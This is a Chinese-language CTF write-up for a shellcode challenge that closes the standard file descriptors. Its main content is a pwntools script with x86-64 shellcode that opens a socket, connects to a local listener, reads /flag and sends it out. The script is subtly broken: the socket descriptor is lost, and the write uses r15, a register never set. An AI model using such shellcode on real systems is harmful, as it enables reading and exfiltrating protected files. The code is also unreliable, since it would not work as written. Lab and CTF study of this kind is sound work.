# 挑战简介
```
这项挑战即将关闭 stdin，这意味着传递第 2 阶段 shellcode 将更加困难。您需要
找到替代解决方案（例如在内存中解包 shellcode）以绕过复杂的过滤器。

这项挑战即将关闭 stderr，这意味着您将无法使用文件描述符 2 进行输出。

这项挑战即将关闭 stdout，这意味着您将无法使用文件描述符 1 进行输出。您将
看不到进一步的输出，并且需要找到另一种将数据传回给您自己的方法。
```

# 思路
stdin,stdout,stderr都是Linux最标准的文件描述符,许多的指令调用中,文件描述符也是必不可少的存在,也就是我们常说的rdi(unsigned int fd)片段  
这个挑战禁用了标准文件描述符  

**我们能用什么?**  
首先我们要认识一些能够直接与内核交互的,独立的,能够自己创建新的文件描述符的一些系统调用,这次的主角是**socket**  
**为什么socket可以绕过标准文件描述符?**
1. 描述符表的动态分配  
即使标准描述符（0、1、2）被关闭，文件描述符表本身依然存在，并且可以继续分配新的描述符。内核只关心该表中的哪些位是未使用的，而不关心之前是否有描述符被关闭。

2. 最小可用描述符策略  
find_next_zero_bit()函数从指定的起始点（通常是0）开始搜索第一个未使用的位。这意味着如果描述符0、1、2都被关闭，那么socket()调用将返回描述符0，因为它是第一个可用的。

3. 描述符的独立性  
每个文件描述符都是独立的实体，指向各自的file结构。关闭一个描述符不会影响其他描述符的功能，只会将其从文件描述符表中移除并标记为可用。
```
+---+    +---+    +---+
| 0 | -> |   |    | S | (新分配的socket)
+---+    +---+    +---+
| 1 | -> |   |    | X | (仍然可用)
+---+    +---+    +---+
| 2 | -> |   |    | X | (仍然可用)
+---+    +---+    +---+
| 3 | -> |   |    |   | (可能被其他打开的文件使用)
+---+    +---+    +---+
  .        .        .
  .        .        .
```
也就是说,用socket,将会新分配文件描述符,即便不可用,再新分配后依然可用  

---
所以我们的策略是,利用socket套接字后,再与本机进行connect连接,后面的操作还是基本的三件套  
```
#!/usr/bin/python
from pwn import *
import struct
import os
cache_dir = '/tmp/.pwntools-cache'
if not os.path.exists(cache_dir):
    os.makedirs(cache_dir)

context(os='linux', arch='amd64', log_level='debug', cache_dir=cache_dir)

# 首先在本地开启一个监听端口
l = listen(4444)

p = process('/challenge/babyshell-level-7')

p.recvuntil('Reading 0x4000 bytes from stdin.\n')

# 修改的shellcode：使用网络连接发送flag内容
shellcode = asm('''
    /* socket(AF_INET, SOCK_STREAM, 0) */
    mov rax, 41
    mov rdi, 2
    mov rsi, 1
    mov rdx, 0
    syscall
    
    /* 保存socket文件描述符 */
    mov rdi, rax
    
    /* 准备struct sockaddr_in */
    sub rsp, 16

    mov word ptr [rsp], 2
    mov word ptr [rsp+2], 0x5c11
    mov word ptr [rsp+4], 0
    mov rsi, rsp
    
    /* connect(sockfd, addr, addrlen) */
    mov rax, 42      /* connect系统调用号 */
    mov rdx, 16      /* addrlen */
    syscall
    
    /* open("/flag", O_RDONLY) */
    mov rax, 2       /* open系统调用号 */
    lea rsi, [rip+flag]
    mov rdi, rsi
    mov rsi, 0       /* O_RDONLY */
    syscall
    
    /* 保存flag文件描述符 */
    mov r8, rax
    
    /* read(flag_fd, buffer, 100) */
    mov rax, 0       /* read系统调用号 */
    mov rdi, r8      /* flag文件描述符 */
    sub rsp, 100     /* 为buffer分配空间 */
    mov rsi, rsp     /* buffer地址 */
    mov rdx, 100     /* 读取大小 */
    syscall
    
    /* write(sockfd, buffer, bytes_read) */
    mov rdx, rax     /* 实际读取的字节数 */
    mov rax, 1       /* write系统调用号 */
    mov rdi, r15     /* socket文件描述符 */
    /* rsi仍然指向buffer */
    syscall
    
    /* 退出程序 */
    mov rax, 60      /* exit系统调用号 */
    xor rdi, rdi
    syscall
    
flag:
    .string "/flag"
''')

print("Shellcode十六进制:", shellcode.hex())
print("Shellcode长度:", len(shellcode), "字节")

p.send(shellcode)

# 等待连接并接收flag
conn = l.wait_for_connection()
flag = conn.recvline()
print("获取到的flag:", flag.decode())

# 与shell交互
p.interactive()
```
